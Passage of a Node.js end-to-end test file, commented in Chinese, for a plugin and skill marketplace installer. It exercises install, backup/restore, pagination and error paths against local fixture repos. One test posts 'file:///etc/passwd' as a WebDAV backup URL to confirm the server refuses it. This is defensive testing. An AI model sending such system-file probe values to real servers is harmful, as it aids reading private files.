#!/usr/bin/env node
// 端到端测试：installRepo 完整流程（真实 git clone + skill 安装 + cordis-plugin 的
// 真实 npm 安装）。通过 apply 捕获 install handler，模拟 HTTP 请求触发；用 git
// url.insteadOf 将 https://github.com/ 重写为本地 fixture 仓库，不依赖网络。
// cordis-plugin 分支用 file: 依赖 + npm_config_offline 离线性安装。
// 前置：git 可用（`git --version`）；npm 缺失时跳过 cordis-plugin 分支。
// 运行：node scripts/tests/e2e/install.e2e.mjs

import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, rmSync, renameSync } from "node:fs";
import { join, dirname } from "node:path";
import { tmpdir } from "node:os";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

// 检查 git
try {
  execFileSync("git", ["--version"], { stdio: "pipe" });
} catch {
  console.log("SKIP: git 不可用，跳过 e2e");
  process.exit(0);
}

// 检查 npm（cordis-plugin 分支需要真实 npm；不可用则只跳过该分支）。
// Windows 上 npm 是 .cmd 垫片，execFile 无法直接启动——用 lib 的 runNpm 同款探测（node + npm-cli.js）。
let npmAvailable = true;
try {
  const cli = join(dirname(process.execPath), "node_modules", "npm", "bin", "npm-cli.js");
  if (existsSync(cli)) {
    execFileSync(process.execPath, [cli, "--version"], { stdio: "pipe" });
  } else {
    execFileSync(process.platform === "win32" ? "npm.cmd" : "npm", ["--version"], { stdio: "pipe" });
  }
} catch {
  npmAvailable = false;
}

// 检查 pnpm（pnpm 分支需要真实 pnpm；缺失时该分支断言为失败路径）。
// Windows 上 pnpm 是 .cmd 垫片——与 lib 的 runPnpm 同款（cmd.exe /c pnpm）。
let pnpmAvailable = true;
try {
  execFileSync(process.platform === "win32" ? "cmd.exe" : "pnpm",
    process.platform === "win32" ? ["/d", "/s", "/c", "pnpm", "--version"] : ["--version"],
    { stdio: "pipe" });
} catch {
  pnpmAvailable = false;
}

// 临时 DSH_HOME + fixture 目录（必须在 lib 加载前设置——用动态 import 控制顺序）
process.env.DSH_HOME = mkdtempSync(join(tmpdir(), "dsh-e2e-")).replace(/\\/g, "/");
const HOME = process.env.DSH_HOME;
const FIXTURE_BASE = join(HOME, "fixtures");

let lib = null;
let pass = 0, fail = 0;
function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++;
  else {
    fail++;
    console.log(`FAIL ${name}: got ${JSON.stringify(actual)}, want ${JSON.stringify(expected)}`);
  }
}

// ---- 构造本地 fixture git 仓库（skill 类型）----
function makeFixtureRepo(name, files) {
  const dir = join(FIXTURE_BASE, name);
  mkdirSync(dir, { recursive: true });
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel);
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, content, "utf8");
  }
  execFileSync("git", ["init", "-q", dir]);
  execFileSync("git", ["-C", dir, "config", "user.email", "e2e@test.local"]);
  execFileSync("git", ["-C", dir, "config", "user.name", "e2e"]);
  execFileSync("git", ["-C", dir, "add", "-A"]);
  execFileSync("git", ["-C", dir, "commit", "-qm", "fixture"]);
  execFileSync("git", ["-C", dir, "update-server-info"]);
  return dir;
}

// 配置 git URL 重写：https://github.com/<owner>/<repo>.git -> 本地 fixture 仓库
// 通过 GIT_CONFIG_GLOBAL 隔离（避免污染全局配置）；路径用正斜杠。
// handler 的 clone URL 是 .../demo-skill.git（带 .git），insteadOf 需包含。
// 可多次调用（追加多个仓库的重写规则）。
function setupUrlRewrite(owner, repoName) {
  const repoPath = join(FIXTURE_BASE, repoName).replace(/\\/g, "/");
  const cfgPath = join(HOME, "gitconfig");
  const entry = `[url "${repoPath}"]\n\tinsteadOf = https://github.com/${owner}/${repoName}.git\n`;
  writeFileSync(cfgPath, (existsSync(cfgPath) ? readFileSync(cfgPath, "utf8") : "") + entry, "utf8");
  process.env.GIT_CONFIG_GLOBAL = cfgPath;
  console.log(`[e2e] ${repoPath} <- https://github.com/${owner}/${repoName}.git`);
}

(async () => {
  // 遗留大小写记录回归（必须在 lib 导入前写盘——loadInstalled 在模块加载时执行）：
  // 旧版 installed.json 可能带原始大小写键（如 "Small-tailqwq/dsh-deep-whale"），
  // 卸载请求经 normalizeRepoRef 为小写——键不规范化会 miss → 假「卸载完成」。
  const legacyInstalledPath = join(HOME, "marketplace", "installed.json");
  mkdirSync(join(HOME, "marketplace"), { recursive: true });
  writeFileSync(legacyInstalledPath, JSON.stringify({
    "Small-Owner/demo-case-skill": { type: "skill", name: "demo-case-skill", location: join(HOME, "skills", "demo-case-skill"), version: null, installedAt: Date.now() }
  }, null, 2), "utf8");
  const caseSkillDir = join(HOME, "skills", "demo-case-skill");
  mkdirSync(caseSkillDir, { recursive: true });
  writeFileSync(join(caseSkillDir, "SKILL.md"), "---\nname: demo-case-skill\n---\n# case\n");

  lib = await import("../../../lib/index.js");
  console.log("[e2e] lib 动态加载后 DSH_HOME =", process.env.DSH_HOME);

  // 隔离网络：apply() 预热的 getList 会真实请求 GitHub API（403 限流影响测试），
  // 全局 mock fetch 返回空列表；仅 git/npm 子进程走真实（本地 fixture）。
  globalThis.fetch = async () => ({
    ok: true, status: 200,
    json: async () => ({ items: [], total_count: 0, repos: [], generated_at: new Date().toISOString() }),
    text: async () => "[]",
  });

  const owner = "e2e-owner";
  const repoName = "demo-skill";
  setupUrlRewrite(owner, repoName);

  // skill fixture：SKILL.md + package.json（detectType 需要判断类型）
  makeFixtureRepo("demo-skill", {
    "SKILL.md": "---\nname: demo-skill\n---\n# Demo skill\n",
    "package.json": JSON.stringify({ name: "demo-skill", version: "1.0.0" }),
  });

  // apply 捕获 install handler
  let installHandler = null;
  const handlers = [];
  const fakeCtx = {
    get: (s) => (s === "webServer" ? { register: (r) => { handlers.push(r); if (r.path === "/api/marketplace/install") installHandler = r.handler; } } : undefined),
    logger: { warn: () => {} },
    slots: { inject: () => {} },
  };
  lib.apply(fakeCtx);
  check("e2e install handler 注册", installHandler !== null, true);

  // 复用：POST /api/marketplace/install 模拟请求，返回 { status, body }
  const postInstall = async (repo, answers) => {
    const bodyStr = JSON.stringify({ repo, answers });
    const req = {
      method: "POST",
      headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
      socket: { remoteAddress: "127.0.0.1" },
      url: "/api/marketplace/install",
      [Symbol.asyncIterator]() {
        let sent = false;
        return {
          next: async () => {
            if (!sent) { sent = true; return { value: Buffer.from(bodyStr), done: false }; }
            return { value: undefined, done: true };
          },
        };
      },
    };
    const out = { status: 0, body: null };
    const res = {
      writeHead: (s) => { out.status = s; },
      end: (b) => { try { out.body = JSON.parse(b); } catch { out.body = b; } },
    };
    await installHandler(req, res);
    return out;
  };

  const uninstallHandler = handlers.find((h) => h.path === "/api/marketplace/uninstall")?.handler;
  const postUninstall = async (repo) => {
    const bodyStr = JSON.stringify({ repo });
    const req = {
      method: "POST",
      headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
      socket: { remoteAddress: "127.0.0.1" },
      url: "/api/marketplace/uninstall",
      [Symbol.asyncIterator]() {
        let sent = false;
        return {
          next: async () => {
            if (!sent) { sent = true; return { value: Buffer.from(bodyStr), done: false }; }
            return { value: undefined, done: true };
          },
        };
      },
    };
    const out = { status: 0, body: null };
    await uninstallHandler(req, { writeHead: (s) => { out.status = s; }, end: (b) => { try { out.body = JSON.parse(b); } catch { out.body = b; } } });
    return out;
  };

  const skillsHandler = handlers.find((h) => h.path === "/api/marketplace/skills")?.handler;
  console.log("[e2e] handlers:", JSON.stringify(handlers.map(h => h.path)));
  if (skillsHandler) {
    let skillsStatus = 0;
    let skillsBody = null;
    const sres = { writeHead: (s) => { skillsStatus = s; }, end: (b) => { try { skillsBody = JSON.parse(b); } catch { skillsBody = b; } } };
    await skillsHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/skills" }, sres);
    check("e2e skills handler 状态", skillsStatus === 200 || skillsStatus === 500, true);
  } else {
    check("e2e skills handler 存在", false, true);
  }

  // ---- 列表兜底顺序（#12）：网络源全挂（本 e2e 无网络 mock，fetch 恒失败）→
  //      内置索引（随包分发，真实 registry.json/skills.json）→ 磁盘缓存 → 搜索兜底。
  //      磁盘缓存用例需临时移开内置文件才能覆盖该层；fire-and-forget 的缓存落盘
  //      用短暂等待规避竞态。----
  // 注：缓存兜底用例由上游 1.4.0 的重写版本覆盖（下方 1-5 步，用 renameSync 临时
  // 移开内置索引文件）——合并时删除旧版重复场景（无内置文件隔离，bundled 源
  // 会先兜底返回真实索引，缓存断言必然失败）。
  const cacheDir2 = join(HOME, "marketplace", "list-cache");
  mkdirSync(cacheDir2, { recursive: true });
  const cachedRepo = { full_name: "cached-owner/demo-cached", name: "demo-cached", description: "cached", html_url: "https://github.com/cached-owner/demo-cached", stargazers_count: 5, updated_at: "2026-01-01T00:00:00Z", default_branch: "main", topics: [], license: null, pkg_name: null, version: null, category: null, has_skill: false, has_install_script: false };
  const bundledDir = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..");
  const bundledDsh = join(bundledDir, "registry.json");
  const bundledSkills = join(bundledDir, "skills.json");
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  /** 轮询等待条件成立（fire-and-forget 缓存写盘完成确认——固定 sleep 与 12MB 写盘
   *  时序不可靠，写盘迟到会覆盖后续重写的缓存文件导致断言竞态，实测不稳定）。 */
  const waitUntil = async (pred, timeoutMs = 5000) => {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
      try { if (await pred()) return true; } catch { /* 继续轮询 */ }
      await sleep(25);
    }
    try { return await pred(); } catch { return false; }
  };

  // 1) dsh 网络全挂 → 内置索引兜底（不含假缓存条目，条目数为真实量级）
  const bundledList = await lib.fetchAllRepos("dsh");
  check("e2e dsh 网络全挂回退内置索引", bundledList.length > 100 && !bundledList.some((r) => r.full_name === "cached-owner/demo-cached"), true);
  // 等待全部 fire-and-forget 缓存写盘任务安定（预热 + 本次可能产生多个写盘任务——
  // 等待首个完成不够，迟到写盘会覆盖后续重写的缓存文件；连续 1s 内容不变视为安定）
  await waitUntil(async () => {
    const snap = () => { try { return readFileSync(join(cacheDir2, "dsh.json"), "utf8"); } catch { return null; } };
    const a = snap();
    if (!a) return false;
    try { if (!Array.isArray(JSON.parse(a).repos) || JSON.parse(a).repos.length <= 100) return false; } catch { return false; }
    await sleep(1000);
    return snap() === a;
  });

  // 2) 内置索引缺失（临时移开）→ 磁盘缓存兜底
  renameSync(bundledDsh, bundledDsh + ".bak");
  try {
    writeFileSync(join(cacheDir2, "dsh.json"), JSON.stringify({ saved_at: new Date().toISOString(), generated_at: new Date().toISOString(), kind: "dsh", count: 1, repos: [cachedRepo] }), "utf8");
    const cachedList = await lib.fetchAllRepos("dsh");
    check("e2e 磁盘缓存兜底返回缓存条目", cachedList.some((r) => r.full_name === "cached-owner/demo-cached"), true);

    // 3) 无内置无缓存 → 搜索兜底；残缺结果不得写盘污染磁盘缓存（#12）
    rmSync(join(cacheDir2, "dsh.json"), { force: true });
    const searchFallback = await lib.fetchAllRepos("dsh");
    check("e2e 无缓存时搜索兜底返回空数组", Array.isArray(searchFallback), true);
    await sleep(200);
    check("e2e 搜索兜底不污染磁盘缓存", existsSync(join(cacheDir2, "dsh.json")), false);
  } finally {
    renameSync(bundledDsh + ".bak", bundledDsh);
  }

  // 4) skills 默认（非刷新）直读内置索引，完全不依赖网络（#12 的核心修复）
  const skillsBundled = await lib.fetchAllRepos("skills");
  check("e2e skills 默认直读内置索引", skillsBundled.length > 10000, true);
  // 等 skills bundled 写盘安定（12MB 写盘 + 预热多个任务——连续 1s 不变视为安定）
  await waitUntil(async () => {
    const snap = () => { try { return readFileSync(join(cacheDir2, "skills.json"), "utf8"); } catch { return null; } };
    const a = snap();
    if (!a) return false;
    try { if (!Array.isArray(JSON.parse(a).repos) || JSON.parse(a).repos.length <= 10000) return false; } catch { return false; }
    await sleep(1000);
    return snap() === a;
  });

  // 5) skills 内置缺失（临时移开）→ 磁盘缓存兜底
  renameSync(bundledSkills, bundledSkills + ".bak");
  try {
    writeFileSync(join(cacheDir2, "skills.json"), JSON.stringify({ saved_at: new Date().toISOString(), generated_at: new Date().toISOString(), kind: "skills", count: 2, repos: [cachedRepo, { ...cachedRepo, full_name: "cached-owner/demo-cached-2", name: "demo-cached-2" }] }), "utf8");
    const cachedSkills = await lib.fetchAllRepos("skills");
    check("e2e skills 磁盘缓存兜底 2 条", cachedSkills.length, 2);
  } finally {
    renameSync(bundledSkills + ".bak", bundledSkills);
  }
  rmSync(join(cacheDir2, "skills.json"), { force: true });

  // ---- #14：skills 服务端分页 + 搜索下推（真实内置索引）----
  if (skillsHandler) {
    let paged = null, pagedStatus = 0;
    await skillsHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/skills?page=1&pageSize=5" }, { writeHead: (s) => { pagedStatus = s; }, end: (b) => { try { paged = JSON.parse(b); } catch { paged = null; } } });
    check("e2e skills 分页 200", pagedStatus, 200);
    check("e2e skills 分页每页≤5", paged && Array.isArray(paged.repos) && paged.repos.length <= 5, true);
    check("e2e skills 分页 total>0", paged && paged.total > 0, true);
    check("e2e skills 分页 page 字段", paged && paged.page, 1);
    let qr = null;
    await skillsHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/skills?page=1&pageSize=10&q=pdf" }, { writeHead: () => {}, end: (b) => { try { qr = JSON.parse(b); } catch { qr = null; } } });
    check("e2e skills 搜索下推过滤", qr && Array.isArray(qr.repos) && qr.repos.length > 0 && qr.repos.every((r) => (r.name + " " + r.full_name + " " + (r.topics || []).join(" ") + " " + (r.description || "")).toLowerCase().includes("pdf")), true);
  }

  // ---- #15：备份 / 恢复 ----
  const backupHandler = handlers.find((h) => h.path === "/api/marketplace/backup")?.handler;
  const diffHandler = handlers.find((h) => h.path === "/api/marketplace/restore/diff")?.handler;
  const wdBackupHandler = handlers.find((h) => h.path === "/api/marketplace/backup/webdav")?.handler;
  check("e2e backup handler 注册", backupHandler !== null, true);
  check("e2e restore/diff handler 注册", diffHandler !== null, true);
  let bk = null, bkStatus = 0;
  await backupHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/backup" }, { writeHead: (s) => { bkStatus = s; }, end: (b) => { try { bk = JSON.parse(b); } catch { bk = null; } } });
  check("e2e backup 200", bkStatus, 200);
  check("e2e backup 含安装记录", bk && bk.backup && Array.isArray(bk.backup.repos) && bk.backup.repos.length >= 1, true);
  check("e2e backup 键已规范化小写", bk && bk.backup.repos.some((r) => r.repo === "small-owner/demo-case-skill"), true);
  let df = null, dfStatus = 0;
  const fakeBackup = {
    repos: [
      { repo: "small-owner/demo-case-skill", type: "skill", name: "demo-case-skill" },
      { repo: "zzz-none/not-installed", type: "skill", name: "x" }
    ]
  };
  const dfReq = {
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/restore/diff",
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(JSON.stringify({ backup: fakeBackup })), done: false }) };
    },
  };
  await diffHandler(dfReq, { writeHead: (s) => { dfStatus = s; }, end: (b) => { try { df = JSON.parse(b); } catch { df = null; } } });
  check("e2e restore/diff 200", dfStatus, 200);
  check("e2e restore/diff missing 只含未安装", df && df.missing, ["zzz-none/not-installed"]);
  check("e2e restore/diff already 含已安装", df && df.already, ["small-owner/demo-case-skill"]);
  let wdStatus = 0;
  const wdReq = {
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    // socket 回环：webdav 守卫已升级为 isWriteAllowed（上游——防 LAN 数据外发）
    socket: { remoteAddress: "127.0.0.1" },
    url: "/api/marketplace/backup/webdav",
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(JSON.stringify({ url: "file:///etc/passwd" })), done: false }) };
    },
  };
  await wdBackupHandler(wdReq, { writeHead: (s) => { wdStatus = s; }, end: () => {} });
  check("e2e webdav 非 http 地址 400", wdStatus, 400);

  // install handler 错误分支：非法 repo → 400
  const badReq = {
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    socket: { remoteAddress: "127.0.0.1" },
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(JSON.stringify({ repo: "bad!" })), done: false }) };
    },
  };
  let badStatus = 0;
  await installHandler(badReq, { writeHead: (s) => { badStatus = s; }, end: () => {} });
  check("e2e install 非法 repo 400", badStatus, 400);

  // install handler 错误分支：无自定义头 → 403
  const noCsrfReq = {
    method: "POST",
    headers: { host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(JSON.stringify({ repo: "a/b" })), done: false }) };
    },
  };
  let csrfStatus = 0;
  await installHandler(noCsrfReq, { writeHead: (s) => { csrfStatus = s; }, end: () => {} });
  check("e2e install 缺 CSRF 头 403", csrfStatus, 403);

  // 模拟 POST /api/marketplace/install（readJsonBody 用 for-await 读 body）
  const bodyStr = JSON.stringify({ repo: `${owner}/demo-skill`, answers: {} });
  const req = {
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    socket: { remoteAddress: "127.0.0.1" },
    [Symbol.asyncIterator]() {
      let sent = false;
      return {
        next: async () => {
          if (!sent) { sent = true; return { value: Buffer.from(bodyStr), done: false }; }
          return { value: undefined, done: true };
        },
      };
    },
  };
  let status = 0;
  let respBody = null;
  const res = {
    writeHead: (s) => { status = s; },
    end: (b) => { try { respBody = JSON.parse(b); } catch { respBody = b; } },
  };

  await installHandler(req, res);
  check("e2e install 状态 200", status, 200);
  check("e2e install 响应含 location", respBody && typeof respBody.location === "string", true);
  console.log("e2e 响应体:", JSON.stringify(respBody));

  // 验证 skill 已安装到 SKILLS_DIR
  const skillDir = join(HOME, "skills", "demo-skill");
  check("e2e skill 目录存在", existsSync(skillDir), true);
  check("e2e SKILL.md 已复制", existsSync(join(skillDir, "SKILL.md")), true);
  check("e2e detectSkillInstalled", await lib.detectSkillInstalled({ full_name: `${owner}/${repoName}`, name: repoName }), true);

  // ---- pathExists resolve 分支：detectInstalled 命中已存在的 skills 目录 ----
  check("e2e detectInstalled 目录命中", await lib.detectInstalled({ full_name: "other-owner/demo-skill", name: "demo-skill" }), true);

  // ---- list handler（/api/marketplace/list）：非 GET → 405；GET → 200/500 ----
  const listHandler = handlers.find((h) => h.path === "/api/marketplace/list")?.handler;
  if (listHandler) {
    let listStatus = 0;
    await listHandler({ method: "POST", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/list" }, { writeHead: (s) => { listStatus = s; }, end: () => {} });
    check("e2e list handler 非 GET 405", listStatus, 405);
    let listGetStatus = 0;
    await listHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/list" }, { writeHead: (s) => { listGetStatus = s; }, end: () => {} });
    check("e2e list handler GET 状态", listGetStatus === 200 || listGetStatus === 500, true);
  } else {
    check("e2e list handler 存在", false, true);
  }

  // ---- env 变量缺失问题流：cordis-plugin 类型（scanRequirements 仅对 script/cordis-plugin 生效）----
  setupUrlRewrite(owner, "demo-skill-env");
  makeFixtureRepo("demo-skill-env", {
    "package.json": JSON.stringify({ name: "demo-skill-env", version: "1.0.0", dsh: {} }),
    ".env.example": "OPENAI_API_KEY=sk-placeholder\n",
  });

  let r;
  r = await postInstall("e2e-owner/demo-skill-env", {});
  check("e2e env 等待输入状态", r.body && r.body.status, "awaiting-input");
  check("e2e env 问题 id", r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].id, "OPENAI_API_KEY");

  r = await postInstall("e2e-owner/demo-skill-env", { OPENAI_API_KEY: "sk-test" });
  check("e2e env 提供后安装 done", r.body && r.body.status, "done");

  // Issue #5 回归：空值跳过——客户端 submit() 预填空串后，服务端「键存在即视为已提供」
  // 判定生效，空串提交必须跳过材料输入直接安装（此前未触碰的键缺失导致死循环弹窗）。
  r = await postInstall("e2e-owner/demo-skill-env", { OPENAI_API_KEY: "" });
  check("e2e env 空串跳过安装 done", r.body && r.body.status, "done");

  // ---- 备份排序：多条安装记录时 installedAt 升序（buildBackup 的 sort 回调）----
  // 此时 installedMap 已有 ≥2 条记录（legacy 遗留 + demo-skill + demo-skill-env），
  // 触发 sort 比较回调（空/单条时 V8 不会调用比较器，覆盖不到该分支）。
  let bkSorted = null, bkSortStatus = 0;
  await backupHandler({ method: "GET", headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" }, url: "/api/marketplace/backup" },
    { writeHead: (s) => { bkSortStatus = s; }, end: (b) => { try { bkSorted = JSON.parse(b); } catch { bkSorted = null; } } });
  const reposSorted = bkSorted && bkSorted.backup && bkSorted.backup.repos;
  check("e2e backup 多记录 200", bkSortStatus, 200);
  check("e2e backup 多记录 installedAt 升序", Array.isArray(reposSorted) && reposSorted.length >= 2
    && reposSorted.every((x, i) => i === 0 || (reposSorted[i - 1].installedAt ?? 0) <= (x.installedAt ?? 0)), true);

  // ---- instructions 手动安装流（无可自动安装内容）----
  setupUrlRewrite(owner, "demo-manual");
  makeFixtureRepo("demo-manual", { "notes.txt": "nothing auto-installable here\n" });

  r = await postInstall("e2e-owner/demo-manual", {});
  check("e2e manual 等待输入状态", r.body && r.body.status, "awaiting-input");
  check("e2e manual 问题 id", r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].id, "__confirm_manual__");

  r = await postInstall("e2e-owner/demo-manual", { __confirm_manual__: "continue" });
  check("e2e manual 结果状态", r.body && r.body.status, "manual");
  check("e2e manual 结果类型", r.body && r.body.type, "instructions");

  // 卡死对话框回归：awaiting-input 回环复用克隆缓存（二次请求不重复克隆，
  // 消除「提交确认后长时间运行中且无法关闭」的窗口）；cancel 后 mutex 释放。
  r = await postInstall("e2e-owner/demo-manual", {});
  check("e2e manual 二次等待输入", r.body && r.body.status, "awaiting-input");
  r = await postInstall("e2e-owner/demo-manual", { __confirm_manual__: "cancel" });
  check("e2e manual cancel → aborted", r.body && r.body.status, "aborted");
  check("e2e manual 回环零克隆", (r.body?.log ?? []).filter((l) => l.includes("克隆完成")).length, 0);
  r = await postInstall("e2e-owner/demo-manual", {});
  check("e2e manual cancel 后 mutex 释放", r.body && r.body.status, "awaiting-input");

  // ---- install handler 状态分支：405 / 413 / 409 ----
  // 405：非 POST 请求（在 readJsonBody 之前短路）
  const mReq = {
    method: "GET",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    socket: { remoteAddress: "127.0.0.1" },
    [Symbol.asyncIterator]() { return { next: async () => ({ value: undefined, done: true }) }; },
  };
  let mStatus = 0;
  await installHandler(mReq, { writeHead: (s) => { mStatus = s; }, end: () => {} });
  check("e2e install 非 POST 405", mStatus, 405);

  // 413：请求体超过 1 MB → readJsonBody 抛 413
  const bigBody = JSON.stringify({ repo: "a/b", answers: { pad: "x".repeat(1024 * 1024 + 10) } });
  const bigReq = {
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    socket: { remoteAddress: "127.0.0.1" },
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(bigBody), done: false }) };
    },
  };
  let bigStatus = 0;
  await installHandler(bigReq, { writeHead: (s) => { bigStatus = s; }, end: () => {} });
  check("e2e install 请求体过大 413", bigStatus, 413);

  // 409：并发安装互斥。两个请求同 tick 同步发起，微任务 FIFO 保证 p1 先
  // 设置 installRunning，p2 再检查命中 409；p1 的 task 是异步 IO，仍在运行。
  const mkReq = (bodyStr) => ({
    method: "POST",
    headers: { "x-dsh-marketplace": "1", host: "127.0.0.1:3080" },
    url: "/api/marketplace/install",
    socket: { remoteAddress: "127.0.0.1" },
    [Symbol.asyncIterator]() {
      let sent = false;
      return { next: async () => sent ? { value: undefined, done: true } : (sent = true, { value: Buffer.from(bodyStr), done: false }) };
    },
  });
  const mkOut = () => { const o = { status: 0, body: null }; return { out: o, res: { writeHead: (s) => { o.status = s; }, end: (b) => { try { o.body = JSON.parse(b); } catch { o.body = b; } } } }; };
  const busy1 = mkOut();
  const busy2 = mkOut();
  const p1 = installHandler(mkReq(JSON.stringify({ repo: "e2e-owner/demo-skill-env", answers: {} })), busy1.res);
  const p2 = installHandler(mkReq(JSON.stringify({ repo: "e2e-owner/demo-skill", answers: {} })), busy2.res);
  await p2;
  check("e2e install 并发互斥 409", busy2.out.status, 409);
  await p1;
  check("e2e install 并发后首个完成", busy1.out.status, 200);

  // ---- cordis-plugin 分支：真实 npm 安装（runNpm / npmInstallWithFallback）----
  if (!npmAvailable) {
    console.log("SKIP: npm 不可用，跳过 cordis-plugin e2e");
  } else {
    // 离线安装：file: 依赖 + npm_config_offline，杜绝对 npm registry 的网络依赖
    process.env.npm_config_offline = "true";
    // Windows 无符号链接特权（非管理员/未开开发者模式）时 npm 对 file: 依赖建 symlink 会 EPERM——
    // 用 install-links 让 file: 依赖复制安装（测试隔离环境适配，非被测行为）
    process.env.npm_config_install_links = "true";

    // 插件 fixture：dsh 字段（通过 looksLikeDshPlugin 免非插件确认）+ pnpm link: 依赖（验证剥离）
    // + file: 依赖（真实 npm install 的载体，完全离线可装）
    setupUrlRewrite(owner, "demo-plugin");
    makeFixtureRepo("demo-plugin", {
      "package.json": JSON.stringify({
        name: "demo-plugin",
        version: "1.0.0",
        dsh: { version: "1.0.0" },
        dependencies: {
          "dep-pkg": "file:packages/dep",
          "pnpm-only": "link:../pnpm-only"
        }
      }),
      "packages/dep/package.json": JSON.stringify({ name: "dep-pkg", version: "1.1.0" }),
      // README 官方 CLI 安装指令（scanCliInstallHint 应识别并随响应返回 cliCommand）
      "README.md": "# demo-plugin\n\n## Install\n```bash\ndsh plugin install e2e-owner/demo-plugin\n```\n",
    });

    let r = await postInstall("e2e-owner/demo-plugin", {});
    check("e2e cordis 安装状态 200", r.status, 200);
    check("e2e cordis 响应 done", r.body && r.body.status, "done");
    check("e2e cordis installed", r.body && r.body.installed, true);
    check("e2e cordis 类型", r.body && r.body.type, "cordis-plugin");
    check("e2e cordis 包名", r.body && r.body.name, "demo-plugin");
    check("e2e README CLI 指令识别", r.body && r.body.cliCommand, "dsh plugin install e2e-owner/demo-plugin");
    check("e2e cordis 版本", r.body && r.body.version, "1.0.0");

    const pluginDir = join(HOME, "profiles", "web", "node_modules", "demo-plugin");
    check("e2e cordis 安装目录存在", existsSync(join(pluginDir, "package.json")), true);
    check("e2e cordis 依赖已安装", existsSync(join(pluginDir, "node_modules", "dep-pkg", "package.json")), true);
    let sanitized = null;
    try { sanitized = JSON.parse(readFileSync(join(pluginDir, "package.json"), "utf8")); } catch { /* keep null */ }
    check("e2e cordis pnpm link 依赖已剥离", sanitized && !("pnpm-only" in (sanitized.dependencies ?? {})), true);
    const patchText = readFileSync(join(HOME, "profiles", "web", "cordis.patch.yml"), "utf8");
    check("e2e cordis patch 已注册", /name:\s*demo-plugin/.test(patchText), true);
    check("e2e cordis detectInstalled", await lib.detectInstalled({ full_name: "e2e-owner/demo-plugin", name: "demo-plugin" }), true);

    // 皮肤/多包仓库：根目录无清单、子目录含多个插件 → 识别为 cordis-plugin 并逐个安装
    setupUrlRewrite(owner, "demo-skins");
    makeFixtureRepo("demo-skins", {
      "README.md": "# demo-skins\n皮肤合集仓库：根目录只有说明，插件在子目录。\n",
      "skins/a/package.json": JSON.stringify({ name: "@dsh-external/dsh-client-ui-skin-a", version: "1.0.0", dsh: { version: "1.0.0" }, main: "index.js" }),
      "skins/a/index.js": "module.exports = {}\n",
      "skins/b/package.json": JSON.stringify({ name: "@dsh-external/dsh-client-ui-skin-b", version: "1.0.0", dsh: { version: "1.0.0" }, main: "index.js" }),
      "skins/b/index.js": "module.exports = {}\n",
    });

    r = await postInstall("e2e-owner/demo-skins", {});
    check("e2e 多插件仓库识别为 cordis-plugin", r.body && r.body.type, "cordis-plugin");
    check("e2e 多插件 count=2", r.body && r.body.count, 2);
    check("e2e 多插件名称", r.body && r.body.name, "2-plugins");
    const skinA = join(HOME, "profiles", "web", "node_modules", "@dsh-external", "dsh-client-ui-skin-a");
    const skinB = join(HOME, "profiles", "web", "node_modules", "@dsh-external", "dsh-client-ui-skin-b");
    check("e2e 多插件 a 已安装", existsSync(join(skinA, "package.json")), true);
    check("e2e 多插件 b 已安装", existsSync(join(skinB, "package.json")), true);
    const skinPatch = readFileSync(join(HOME, "profiles", "web", "cordis.patch.yml"), "utf8");
    check("e2e 多插件 patch 注册 a", skinPatch.includes("@dsh-external/dsh-client-ui-skin-a"), true);
    check("e2e 多插件 patch 注册 b", skinPatch.includes("@dsh-external/dsh-client-ui-skin-b"), true);
    check("e2e 多插件仓库 detectInstalled", await lib.detectInstalled({ full_name: "e2e-owner/demo-skins", name: "demo-skins" }), true);

    // npm 生命周期脚本确认流：有 prepare 脚本 → 先弹确认；deny → 中止并清空缓存
    setupUrlRewrite(owner, "demo-plugin-scripts");
    makeFixtureRepo("demo-plugin-scripts", {
      "package.json": JSON.stringify({
        name: "demo-plugin-scripts",
        version: "1.0.0",
        dsh: { version: "1.0.0" },
        scripts: { prepare: "echo skip" }
      }),
    });

